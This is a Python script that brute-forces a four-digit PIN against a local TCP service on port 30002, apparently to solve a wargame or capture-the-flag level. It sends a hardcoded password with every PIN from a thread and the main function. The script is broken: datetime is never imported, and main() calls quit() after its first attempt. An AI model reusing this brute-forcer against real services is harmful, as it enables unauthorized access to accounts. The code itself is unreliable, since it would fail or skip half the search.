import socket
import threading


target = '127.0.0.1'
target_port = 30002
begin_time = datetime.datetime.now()

def thread1():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
        client.connect((target, target_port))
        data = client.recv(1024)
        print('Starting thread')
        for i in range(0, 5000):
            client.send(bytes('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ {}\n'.format(str(i).zfill(4)), 'utf-8'))
            data = client.recv(1024)
            response = repr(data)
            if data.decode('utf-8') == 'Wrong! Please enter the correct pincode. Try again.\n':
                continue
            else:
                print('Found password! Pin: {}'.format(i))
                print(data.decode('utf-8'))
                break


def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
            client.connect((target, target_port))
            data = client.recv(1024)
            print('Starting main')
            for i in range(5000, 10000):
                client.send(bytes('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ {}\n'.format(str(i).zfill(4)), 'utf-8'))
                data = client.recv(1024)
                response = repr(data)
                quit()
                if data.decode('utf-8') == 'Wrong! Please enter the correct pincode. Try again.\n':
                    continue
                else:
                    print('Found password! Pin: {}'.format(i))
                    print(data.decode('utf-8'))
                    break



if __name__ == '__main__':
    a = threading.Thread(name='thread1', target=thread1)
    a.start()
    main()
